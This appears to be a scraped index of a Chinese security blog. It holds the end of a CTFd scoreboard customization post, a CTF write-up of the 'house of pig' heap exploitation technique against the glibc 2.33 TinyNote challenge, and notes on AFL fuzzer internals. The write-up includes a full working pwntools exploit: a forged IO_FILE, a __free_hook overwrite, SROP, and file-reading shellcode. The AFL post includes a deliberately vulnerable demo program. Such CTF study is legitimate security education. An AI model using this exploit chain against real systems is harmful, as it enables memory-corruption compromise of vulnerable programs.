get_standings(None, False, request=1) return render_template( \"scoreboard.html\", standings=standings, infos=infos )@scoreboard.route(\"/scoreboard/2\")@check_score_visibilitydef listing2(): infos = get_infos() if config.is_scoreboard_frozen(): infos.append(\"Scoreboard has been frozen\") if is_admin() is True and scores_visible() is False: infos.append(\"Scores are not currently visible to users\") clear_standings() standings = get_standings(None, False, request=2) return render_template( \"scoreboard.html\", standings=standings, infos=infos ) 计分图版/CTFd/CTFd/api/v1/scoreboard.py, 对接口请求时的url进行分类，先添加request 1from flask import request 然后对接口 @scoreboard_namespace.route(&quot;/top/&lt;count&gt;&quot;)里进行修改，添加 1234567891011121314151617@scoreboard_namespace.route(\"/top/&lt;count&gt;\")@scoreboard_namespace.param(\"count\", \"How many top teams to return\")class ScoreboardDetail(Resource): @check_account_visibility @check_score_visibility @cache.cached(timeout=60, key_prefix=make_cache_key) def get(self, count): clear_standings() response = &#123;&#125; if \"/scoreboard/1\" in request.headers['Referer']: board_type = 1 elif \"/scoreboard/2\" in request.headers['Referer']: board_type = 2 else: board_type = 0 standings = get_standings(count=count, request=board_type) 然后将 get_standings 的参数改成standings = get_standings(count=count, request=board_type) 一些还没来的及实现的功能 前三血自动播报 在解题面板区分校内和校外 ## 0x02 赛后反思题目难度最后pwn题只有两道题目有解，感觉后面出题可以效仿中科大，不必拘泥于ctf形式，还是以简单有趣为主。让更多的人有参与感，能学到东西。题面上可以多给提示 服务器运维 采用4c8g服务器，1000Mb带宽，刚开始带宽开小了导致平台非常卡。 题目与平台都在一个服务器上，cpu负载很高，下次可以分布式部署","tags":[{"name":"平台部署","slug":"平台部署","permalink":"wood1314.github.io/tags/平台部署/"}]},{"title":"2.33下的house of pig","date":"2021-11-22T15:16:10.000Z","path":"year/11/22/cl6ewld870001j63f3c92sd9b/","text":"以最近在西湖论剑上碰到的题目，TinyNode来记录下libc2-33下，house of pig的利用流程 0x01 house of pig1.1 利用条件 至少存在uaf 程序可通过某种方式退出 当 libc 执行abort流程时。 程序显式调用 exit 。 程序能通过主函数返回。 1.2 利用思路house of pig的利用思路就是，利用一个堆地址任意地址写，将_IO_list_all或者某个IO_FILE的chain字段，覆写为一个我们可以控制的堆地址，并在这个堆地址上伪造IO_FILE结构。当程序退出前会调用_IO_flush_all_lockp函数来flush所有IO流，当flush到我们伪造的IO_FILE结构时因为其参数和结构都是我们可控的，因此可以达到劫持控制流的目的。 在该堆地址构造 FILE 结构的时候，重点是将其vtable由 _IO_file_jumps修改为 _IO_str_jumps，那么当原本应该调用IO_file_overflow的时候，就会转而调用如下的IO_str_overflow。而该函数是以传入的 FILE 地址本身为参数的，同时其中会连续调用 malloc、memcpy、free 函数（如下图），且三个函数的参数又都可以被该 FILE 结构中的数据控制。 我们可以先通过malloc把提前放在tcache里的__free_hook取出来，然后利用memcpy将__free_hook修改为setcontext + 61，后面再调用free_hook触发SROP执行mprotect，再跳转到shellcode上完成整个orw的过程。 1.3 libc2-33新增的保护除了2.32增加的对tache的指针进行一个异或它本身地址右移12位的操作之外，还新增了申请新地址时必须满足0x10对齐的限制。 0x02 西湖论剑2021 TinyNote2.1 题目分析main大概来看有四个功能，add，show，edit，delete 12345678910111213141516171819202122232425262728293031void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; int v3; // eax sub_126F(); while ( 1 ) &#123; while ( 1 ) &#123; v3 = menu(); if ( v3 != 2 ) break; edit(); &#125; if ( v3 &gt; 2 ) &#123; if ( v3 == 3 ) &#123; show(); &#125; else if ( v3 == 4 ) &#123; delete(); &#125; &#125; else if ( v3 == 1 ) &#123; add(); &#125; &#125;&#125; addadd功能是只可以申请0x10大小的chunk，而且sub_141E函数对malloc进行了一个封装，禁止我们申请堆空间以外的地址。 12345678910111213141516171819202122int add()&#123; void **v0; // rax int idx; // [rsp+4h] [rbp-Ch] void *v3; // [rsp+8h] [rbp-8h] sub_1240(\"Index:\"); LODWORD(v0) = sub_1465(); idx = (signed int)v0; if ( (signed int)v0 &gt;= 0 &amp;&amp; (signed int)v0 &lt;= 2 ) &#123; v3 = (void *)sub_141E(0x10uLL); if ( !v3 ) &#123; sub_1240(\"internal error\"); exit(0); &#125; v0 = chunk_buf; chunk_buf[idx] = v3; &#125; return (signed int)v0;&#125; showshow没什么好说的，中规中矩的一个泄漏 123456789101112131415161718int sub_15B1()&#123; void *v0; // rax int v2; // [rsp+Ch] [rbp-4h] sub_1240(\"Index:\"); LODWORD(v0) = sub_1465(); v2 = (signed int)v0; if ( (signed int)v0 &gt;= 0 &amp;&amp; (signed int)v0 &lt;= 2 ) &#123; v0 = chunk_buf[(signed int)v0]; if ( v0 ) &#123; sub_1240(\"Content:\"); LODWORD(v0) = write(1, chunk_buf[v2], 0x10uLL); &#125; &#125; return (signed int)v0; delete存在uaf漏洞，free之后没有把指针清空 123456789101112void sub_1626()&#123; int v0; // [rsp+Ch] [rbp-4h] sub_1240(\"Index:\"); v0 = sub_1465(); if ( v0 &gt;= 0 &amp;&amp; v0 &lt;= 2 ) &#123; if ( chunk_buf[v0] ) free(chunk_buf[v0]); &#125;&#125; 2.2 利用分析 利用uaf首先把heap地址和libc地址泄漏出来 因为只能申请0x10大小的chunk，因此利用[fastbin_reverse_into_tcache](house_of_botcake &amp;&amp; fastbin_reverse_into_tcache | 木头的小木屋 (wood1314.github.io))进行一个任意地址写堆地址。这个时候由于libc2-33的对齐保护，所以_IO_list_all是不能劫持的，stderr等也不能直接劫持，只能选择_IO_2_1_stderr的chain字段，利用我们tcache的key来劫持，正好可以劫持到heapbase+0x10的位置。这里不用fd字段劫持的原因是，fd字段会被抑或成一个很奇怪的字段，影响后续利用。 伪造IO_FILE结构，劫持控制流执行orw 2.3 利用过程预备工作使用patch-elf修改题目libc为对应版本的glibc-all-in-one中的libc，方便带符号调试 123patchelf --set-interpreter /home/wood/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/ld-2.33.so ./TinyNotepatchelf --replace-needed libc.so.6 /home/wood/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc.so.6 ./TinyNote 泄漏heap 地址和libc 地址1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import *# context.log_level = 'DEBUG'context.os = 'linux'context.arch = 'amd64'libc = ELF('/home/wood/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc.so.6')sh = process('./TinyNote')def Menu(choice): sh.recvuntil('Choice:') sh.sendline(str(choice))def Add(idx): Menu(1) sh.recvuntil(':') sh.sendline(str(idx))def Edit(idx, content): Menu(2) sh.recvuntil(':') sh.sendline(str(idx)) sh.recvuntil(\":\") sh.send(content)def Show(idx): Menu(3) sh.recvuntil(':') sh.sendline(str(idx))def Dlete(idx): Menu(4) sh.recvuntil(':') sh.sendline(str(idx))Add(0)Add(1)Add(2)Dlete(0)Show(0)sh.recvuntil(':')key = u64(sh.recv(8))heap_base = key &lt;&lt; 12log.success('heapbase: ' + hex(heap_base))for i in range(0x31): Add(2)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x330)))Add(2)Add(2)Edit(2,p64(0)+p64(0x421))Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x340)))Add(2)Add(2)Dlete(2)Show(2)sh.recvuntil(':')libc_base = u64(sh.recv(8)) - 0x1e0c00 log.success('libc_base: ' + hex(libc_base)) 构造fake_FILE1234567891011121314151617181920212223242526272829IO_str_vtable = libc_base + 0x1e2560system_addr = libc_base + libc.sym['system']free_hook = libc_base + libc.sym['__free_hook']setcontext = libc_base + 0x52970 + 61gadget = libc_base + 0x000000000014a0a0fake_IO_FILE = 2*p64(0)fake_IO_FILE += p64(1) #change _IO_write_base = 1fake_IO_FILE += p64(0xffffffffffff) #change _IO_write_ptr = 0xfffffffffffffake_IO_FILE += p64(0)fake_IO_FILE += p64(heap_base+0x500) #v4fake_IO_FILE += p64(heap_base+0x508) #v5fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b'\\x00')fake_IO_FILE += p64(0) #change _mode = 0fake_IO_FILE = fake_IO_FILE.ljust(0xc8, b'\\x00')fake_IO_FILE += p64(IO_str_vtable) payload = fake_IO_FILE + b'/bin/sh\\x00' + 2*p64(setcontext)for i in range(len(payload)//0x10 + 1): Edit(0, p64(0)*2) Dlete(0) Edit(0, p64(0)*2) Dlete(0) Edit(0, p64(key ^ (heap_base + 0x20 + 0x10*i))) Add(2) Add(2) Edit(2, payload[i*0x10:(i+1)*0x10]) 为后面的利用提前布置一些地址12345678910111213141516171819202122232425262728293031323334353637383940414243444546# put free_hook on tcache in 0x80 sizeEdit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0xc0)))Add(2)Add(2)Edit(2, p64((free_hook)))# set tcache sizeEdit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x10)))Add(2)Add(2)Edit(2, p64(0) + p64(0x101000000))# write rdi address Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x500)))Add(2)Add(2)Edit(2, p64(gadget) + p64(0x300 + heap_base))# set shellcode addrEdit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x520)))Add(2)Add(2)Edit(2, p64(0) + p64(heap_base + 0x900)) 设置SROP的frame以及shellcode12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576# set frameshellcode = '''mov rax,0x67616c662f2epush raxmov rdi,rspmov rsi,0mov rdx,0mov rax,2syscallmov rdi,raxmov rsi,rspmov rdx,1024mov rax,0syscallmov rdi,1mov rsi,rspmov rdx,raxmov rax,1syscallmov rdi,0mov rax,60syscall'''frame = SigreturnFrame()frame.rsp = heap_base + 0x528frame.rdi = heap_baseframe.rsi = 0x5000frame.rdx = 4 | 2 | 1frame.rip = libc.sym['mprotect'] + libc_basepayload = bytes(frame)for i in range(len(payload)//0x10): Edit(0, p64(0)*2) Dlete(0) Edit(0, p64(0)*2) Dlete(0) Edit(0, p64(key ^ (heap_base + 0x300 + i*0x10))) Add(2) Add(2) Edit(2, payload[i*0x10: (i+1)*0x10])Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x320)))Add(2)Add(2)Edit(2, p64(setcontext))# # set shellcode in heappayload = bytes(asm(shellcode))for i in range(len(payload)//0x10): Edit(0, p64(0)*2) Dlete(0) Edit(0, p64(0)*2) Dlete(0) Edit(0, p64(key ^ (heap_base + 0x900 + i*0x10))) Add(2) Add(2) Edit(2, payload[i*0x10: (i+1)*0x10]) 构造 fastbin_reverse_to_tcache这里注意要把fastbin填为8个，这样的话就不会在reverse_into_tcache的时候引入别的chunk。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990# #Create a fake fastbin chainsEdit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x820)))Add(2)Add(2)Edit(2, p64(key ^ (heap_base + 0x830)))Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x840)))Add(2)Add(2)Edit(2, p64(key ^ (heap_base + 0x850)))Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x860)))Add(2)Add(2)Edit(2, p64(key ^ (heap_base + 0x870)))Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x880)))Add(2)Add(2)Edit(2, p64(key ^ (heap_base + 0x890)))Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x8a0)))Add(2)Add(2)Edit(2, p64(key ^ (heap_base + 0x8b0)))Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x8c0)))Add(2)Add(2)Edit(2, p64((libc_base + libc.sym['_IO_2_1_stderr_'] + 0x60 - 0x10) ^ key)+ p64(0))Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x90)))Add(2)Add(2)for i in range(7): Edit(0, p64(0)*2) Dlete(0)Dlete(1)Edit(1, p64(key ^ (heap_base + 0x810)))for i in range(6): Add(0)Edit(0, p64(key))Add(0) 在此时fastbin的状态如下 然后 1Add(0) 大胜利！ 0x03 完成exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339from pwn import *# context.log_level = 'DEBUG'context.os = 'linux'context.arch = 'amd64'libc = ELF('/home/wood/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/libc.so.6')sh = process('./TinyNote')def Menu(choice): sh.recvuntil('Choice:') sh.sendline(str(choice))def Add(idx): Menu(1) sh.recvuntil(':') sh.sendline(str(idx))def Edit(idx, content): Menu(2) sh.recvuntil(':') sh.sendline(str(idx)) sh.recvuntil(\":\") sh.send(content)def Show(idx): Menu(3) sh.recvuntil(':') sh.sendline(str(idx))def Dlete(idx): Menu(4) sh.recvuntil(':') sh.sendline(str(idx))Add(0)Add(1)Add(2)Dlete(0)Show(0)sh.recvuntil(':')key = u64(sh.recv(8))heap_base = key &lt;&lt; 12log.success('heapbase: ' + hex(heap_base))for i in range(0x31): Add(2)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x330)))Add(2)Add(2)Edit(2,p64(0)+p64(0x421))Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x340)))Add(2)Add(2)Dlete(2)Show(2)sh.recvuntil(':')libc_base = u64(sh.recv(8)) - 0x1e0c00 log.success('libc_base: ' + hex(libc_base))for i in range(0x20): Add(0)Add(2)IO_str_vtable = libc_base + 0x1e2560system_addr = libc_base + libc.sym['system']free_hook = libc_base + libc.sym['__free_hook']setcontext = libc_base + 0x52970 + 61gadget = libc_base + 0x000000000014a0a0fake_IO_FILE = 2*p64(0)fake_IO_FILE += p64(1) #change _IO_write_base = 1fake_IO_FILE += p64(0xffffffffffff) #change _IO_write_ptr = 0xfffffffffffffake_IO_FILE += p64(0)fake_IO_FILE += p64(heap_base+0x500) #v4fake_IO_FILE += p64(heap_base+0x508) #v5fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b'\\x00')fake_IO_FILE += p64(0) #change _mode = 0fake_IO_FILE = fake_IO_FILE.ljust(0xc8, b'\\x00')fake_IO_FILE += p64(IO_str_vtable) payload = fake_IO_FILE + b'/bin/sh\\x00' + 2*p64(setcontext)for i in range(len(payload)//0x10 + 1): Edit(0, p64(0)*2) Dlete(0) Edit(0, p64(0)*2) Dlete(0) Edit(0, p64(key ^ (heap_base + 0x20 + 0x10*i))) Add(2) Add(2) Edit(2, payload[i*0x10:(i+1)*0x10])# put free_hook on tcache in 0x80 sizeEdit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0xc0)))Add(2)Add(2)Edit(2, p64((free_hook)))# set tcache sizeEdit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x10)))Add(2)Add(2)Edit(2, p64(0) + p64(0x101000000))# write rdi address Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x500)))Add(2)Add(2)Edit(2, p64(gadget) + p64(0x300 + heap_base))# set shellcode addrEdit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x520)))Add(2)Add(2)Edit(2, p64(0) + p64(heap_base + 0x900))# set frameshellcode = '''mov rax,0x67616c662f2epush raxmov rdi,rspmov rsi,0mov rdx,0mov rax,2syscallmov rdi,raxmov rsi,rspmov rdx,1024mov rax,0syscallmov rdi,1mov rsi,rspmov rdx,raxmov rax,1syscallmov rdi,0mov rax,60syscall'''frame = SigreturnFrame()frame.rsp = heap_base + 0x528frame.rdi = heap_baseframe.rsi = 0x5000frame.rdx = 4 | 2 | 1frame.rip = libc.sym['mprotect'] + libc_basepayload = bytes(frame)for i in range(len(payload)//0x10): Edit(0, p64(0)*2) Dlete(0) Edit(0, p64(0)*2) Dlete(0) Edit(0, p64(key ^ (heap_base + 0x300 + i*0x10))) Add(2) Add(2) Edit(2, payload[i*0x10: (i+1)*0x10])Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x320)))Add(2)Add(2)Edit(2, p64(setcontext))# # set shellcode in heappayload = bytes(asm(shellcode))for i in range(len(payload)//0x10): Edit(0, p64(0)*2) Dlete(0) Edit(0, p64(0)*2) Dlete(0) Edit(0, p64(key ^ (heap_base + 0x900 + i*0x10))) Add(2) Add(2) Edit(2, payload[i*0x10: (i+1)*0x10])# #Create a fake fastbin chainsEdit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x820)))Add(2)Add(2)Edit(2, p64(key ^ (heap_base + 0x830)))Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x840)))Add(2)Add(2)Edit(2, p64(key ^ (heap_base + 0x850)))Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x860)))Add(2)Add(2)Edit(2, p64(key ^ (heap_base + 0x870)))Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x880)))Add(2)Add(2)Edit(2, p64(key ^ (heap_base + 0x890)))Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x8a0)))Add(2)Add(2)Edit(2, p64(key ^ (heap_base + 0x8b0)))Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x8c0)))Add(2)Add(2)Edit(2, p64((libc_base + libc.sym['_IO_2_1_stderr_'] + 0x60 - 0x10) ^ key)+ p64(0))Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(0)*2)Dlete(0)Edit(0, p64(key ^ (heap_base + 0x90)))Add(2)Add(2)for i in range(7): Edit(0, p64(0)*2) Dlete(0)Dlete(1)Edit(1, p64(key ^ (heap_base + 0x810)))for i in range(6): Add(0)Edit(0, p64(key))Add(0)Add(0)gdb.attach(sh)Edit(2, p64(libc_base + libc.sym['__malloc_hook']))Add(0)sh.interactive() 0x04 附件链接: https://pan.baidu.com/s/1okMdhQF0z8RQmEOCQM6eng 提取码: 5871 0x05参考!(house of pig一个新的堆利用详解 - 安全客，安全资讯平台 (anquanke.com))","tags":[]},{"title":"AFL初探","date":"2021-11-19T14:53:07.000Z","path":"year/11/19/cl6ewld8h0006j63frl509qsl/","text":"最近在写跟AFL有关的fuzz，因此就大概过了一下AFL的源码。这里大概记录一下自己看的过程。 0x01 AFL基本使用1.1 使用AFL程序插桩目标程序 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;signal.h&gt;int vuln(char *str)&#123; int len = strlen(str); if(str[0] == 'A' &amp;&amp; len == 66) &#123; raise(SIGSEGV); //如果输入的字符串的首字符为A并且长度为66，则异常退出 &#125; else if(str[0] == 'F' &amp;&amp; len == 6) &#123; raise(SIGSEGV); //如果输入的字符串的首字符为F并且长度为6，则异常退出 &#125; else &#123; printf(\"it is good!\\\\n\"); &#125; return 0;&#125;int main(int argc, char *argv[])&#123; char buf[100]=&#123;0&#125;; gets(buf);//存在栈溢出漏洞 printf(buf);//存在格式化字符串漏洞 vuln(buf); return 0;&#125; 使用afl-gcc进行插桩编译 afl-gcc -g -o ./zerotest/vuln ./zerotest/vuln.c 1.2 开始fuzz afl-fuzz -m 300 -i ./zerotest/fuzz_in -o ./zerotest/fuzz_out ./zerotest/vuln -f PS: 常见参数的含义如下 f参数表示：testcase的内容会作为afl_test的stdin m参数表示分配的内存空间 i 指定测试样本的路径 o 指定输出结果的路径 /dev/null 使错误信息不输出到屏幕 t：设置程序运行超时值，单位为 ms M：运行主(Master) Fuzzer S：运行从属(Slave) Fuzzer 1.3 fuzz的结果 从界面上主要注意以下几点: last new path 如果报错那么要及时修正命令行参数，不然继续fuzz也是徒劳（因为路径是不会改变的）； cycles done 如果变绿就说明后面及时继续fuzz，出现crash的几率也很低了，可以选择在这个时候停止 uniq crashes 代表的是crash的数量 1.4 crash分析 PS: xxd命令的作用就是将一个文件以十六进制的形式显示出来 看起来上面两个crash，第一个大概是栈溢出，第二个看起来是F开头，字符长度为6触发的 0x02 源码阅读2.1 合法代码插桩——插入调用__afl_maybe_log的汇编码若pass_thru、skip_intel、skip_app、skip_csect四个标志位均被清除，且instr_ok(这个标志位表征当前读入的行处于.text部分，将在后续设置，初始为清除状态)、instrument_next两个标志位均被设置，且当前行的第一个字符是\\\\t且第二个字符是字母，则向已插桩的文件写入trampoline_fmt_64/trampoline_fmt_32(取决于use_64bit标志位状态)经整理最后插入的汇编代码为： 1234567891011121314151617181920212223242526272829/* --- AFL TRAMPOLINE (32-BIT) --- */.align 4leal -16(%esp), %espmovl %edi, 0(%esp)movl %edx, 4(%esp)movl %ecx, 8(%esp)movl %eax, 12(%esp)movl $0x%08x, %ecxcall __afl_maybe_logmovl 12(%esp), %eaxmovl 8(%esp), %ecxmovl 4(%esp), %edxmovl 0(%esp), %edileal 16(%esp), %esp/* --- END --- *//* --- AFL TRAMPOLINE (64-BIT) --- */.align 4leaq -(128+24)(%rsp), %rspmovq %rdx, 0(%rsp)movq %rcx, 8(%rsp)movq %rax, 16(%rsp)movq $0x%08x, %rcxcall __afl_maybe_logmovq 16(%rsp), %raxmovq 8(%rsp), %rcxmovq 0(%rsp), %rdxleaq (128+24)(%rsp), %rsp/* --- END --- */ ⚠️：此处的%08x由(random() % ((1 &lt;&lt; 16)))生成，在编译期确定。插入结束后，将instrument_next标志位清除，桩代码计数器ins_lines加一。最后将原始的汇编码（即line变量的内容），追加到插桩后文件中。此时检查pass_thru标志位是否被置位，若已置位，则忽略以下流程，继续循环，读取下一行待插桩文件。 2.2 寻找合法有效的待插桩段这里是真正的插桩函数的核心了，但是在这里我们真正感兴趣的事实上只有.text段 简单概括就是，先找到.text段，不在该段的情况下不会进行打桩操作 然后会在分支跳转（条件分支跳转）的部分插入trampoline_fmt_64/trampoline_fmt_32 注意，JMP表示无条件跳转，因此其另一条分支将永远不会被运行到，那么将不会影响代码覆盖率，因此不在JMP指令后插桩。 识别label以后，会在label的下一行插入trampoline_fmt_64/trampoline_fmt_32 2.3 末尾插桩代码最后，若桩代码计数器ins_lines不为0，那么将main_payload_64/main_payload_32(取决于use_64bit标志位状态)插入整个汇编文件末尾。 main_payload_64整体逻辑如下 简要概括就是，将随机生成的rcx与一个值做一个抑或，再把以此作为索引的共享区加一。相当于一个散列表，这样可以知道fuzz是不是经过了一个新的基本块。 0x03 AFL 变异部分源码分析3.1 fuzz_one Take the current entry from the queue, fuzz it for a while. This function is a tad too long… 首先把testcase映射在内存中，主要是把testcase里的内容读进in_buf里 12345678910111213/* Map the test case into memory. */ fd = open(queue_cur-&gt;fname, O_RDONLY); if (fd &lt; 0) PFATAL(\"Unable to open '%s'\", queue_cur-&gt;fname); len = queue_cur-&gt;len; orig_in = in_buf = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0); if (orig_in == MAP_FAILED) PFATAL(\"Unable to mmap '%s'\", queue_cur-&gt;fname); close(fd); 接着对testcase进行一个裁剪的过程，然后把in_buf里的内容拷贝到out_buf里 12345678910111213141516171819202122232425/************ * TRIMMING * ************/ if (!dumb_mode &amp;&amp; !queue_cur-&gt;trim_done) &#123; u8 res = trim_case(argv, queue_cur, in_buf); if (res == FAULT_ERROR) FATAL(\"Unable to execute target application\"); if (stop_soon) &#123; cur_skipped_paths++; goto abandon_entry; &#125; /* Don't retry trimming, even if it failed. */ queue_cur-&gt;trim_done = 1; if (len != queue_cur-&gt;len) len = queue_cur-&gt;len; &#125; memcpy(out_buf, in_buf, len); 计算performance score ,这个值的计算方法有点复杂，先留个坑，暂且不深究 1234567891011121314151617181920/********************* * PERFORMANCE SCORE * *********************/ orig_perf = perf_score = calculate_score(queue_cur); /* Skip right away if -d is given, if we have done deterministic fuzzing on this entry ourselves (was_fuzzed), or if it has gone through deterministic testing in earlier, resumed runs (passed_det). */ if (skip_deterministic || queue_cur-&gt;was_fuzzed || queue_cur-&gt;passed_det) goto havoc_stage; /* Skip deterministic fuzzing if exec path checksum puts this out of scope for this master instance. */ if (master_max &amp;&amp; (queue_cur-&gt;exec_cksum % master_max) != master_id - 1) goto havoc_stage; doing_det = 1; 第一阶段的Bitflip 也就是 bitflip 1/1 ，可以看到 stage_max = len &lt;&lt; 3; 然后进行了stage_max次数的循环，也就是每字节会做8次bitflip，逐个字节逐个比特进行反转。 反转后调用common_fuzz_stuff 函数，进行fuzz，fuzz过后再次把比特反转回复过来。 在这个阶段还实现了采集token的功能。即如果连续几个字节，反转其最后一个比特后其执行路径相同，且与初始路径不同。那么这连续的几个字节很大概率是有特殊语义的token ，属于关键字性质的。 例如，PNG文件中用IHDR作为起始块的标识，那么就会存在类似于以下的内容 1........IHDR........ 当翻转到字符I的最高位时，因为IHDR被破坏，此时程序的执行路径肯定与处理正常文件的路径是不同的；随后，在翻转接下来3个字符的最高位时，IHDR标识同样被破坏，程序应该会采取同样的执行路径。由此，AFL就判断得到一个可能的token：IHDR，并将其记录下来为后面的变异提供备选。 AFL采取的这种方式是非常巧妙的：就本质而言，这实际上是对每个byte进行修改并检查执行路径；但集成到bitflip后，就不需要再浪费额外的执行资源了。此外，为了控制这样自动生成的token的大小和数量，AFL还在config.h中通过宏定义了限制： 1234567/* Length limits for auto-detected dictionary tokens: */#define MIN_AUTO_EXTRA 3 #define MAX_AUTO_EXTRA 32 /* Maximum number of auto-extracted dictionary tokens to actually use in fuzzing (first value), and to keep in memory as candidates. The latter should be much higher than the former. */#define USE_AUTO_EXTRAS 10 #define MAX_AUTO_EXTRAS (USE_AUTO_EXTRAS * 10) 对于一些文件来说，我们已知其格式中出现的token长度不会超过4，那么我们就可以修改MAX_AUTO_EXTRA为4并重新编译AFL，以排除一些明显不会是token的情况。遗憾的是，这些设置是通过宏定义来实现，所以不能做到运行时指定，每次修改后必须重新编译AFL。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105/********************************************* * SIMPLE BITFLIP (+dictionary construction) * *********************************************/#define FLIP_BIT(_ar, _b) do &#123; \\ u8* _arf = (u8*)(_ar); \\ u32 _bf = (_b); \\ _arf[(_bf) &gt;&gt; 3] ^= (128 &gt;&gt; ((_bf) &amp; 7)); \\ &#125; while (0) /* Single walking bit. */ stage_short = \"flip1\"; stage_max = len &lt;&lt; 3; stage_name = \"bitflip 1/1\"; stage_val_type = STAGE_VAL_NONE; orig_hit_cnt = queued_paths + unique_crashes; prev_cksum = queue_cur-&gt;exec_cksum; for (stage_cur = 0; stage_cur &lt; stage_max; stage_cur++) &#123; stage_cur_byte = stage_cur &gt;&gt; 3; FLIP_BIT(out_buf, stage_cur); if (common_fuzz_stuff(argv, out_buf, len)) goto abandon_entry; FLIP_BIT(out_buf, stage_cur); /* While flipping the least significant bit in every byte, pull of an extra trick to detect possible syntax tokens. In essence, the idea is that if you have a binary blob like this: xxxxxxxxIHDRxxxxxxxx ...and changing the leading and trailing bytes causes variable or no changes in program flow, but touching any character in the \"IHDR\" string always produces the same, distinctive path, it's highly likely that \"IHDR\" is an atomically-checked magic value of special significance to the fuzzed format. We do this here, rather than as a separate stage, because it's a nice way to keep the operation approximately \"free\" (i.e., no extra execs). Empirically, performing the check when flipping the least significant bit is advantageous, compared to doing it at the time of more disruptive changes, where the program flow may be affected in more violent ways. The caveat is that we won't generate dictionaries in the -d mode or -S mode - but that's probably a fair trade-off. This won't work particularly well with paths that exhibit variable behavior, but fails gracefully, so we'll carry out the checks anyway. */ if (!dumb_mode &amp;&amp; (stage_cur &amp; 7) == 7) &#123; u32 cksum = hash32(trace_bits, MAP_SIZE, HASH_CONST); if (stage_cur == stage_max - 1 &amp;&amp; cksum == prev_cksum) &#123; /* If at end of file and we are still collecting a string, grab the final character and force output. */ if (a_len &lt; MAX_AUTO_EXTRA) a_collect[a_len] = out_buf[stage_cur &gt;&gt; 3]; a_len++; if (a_len &gt;= 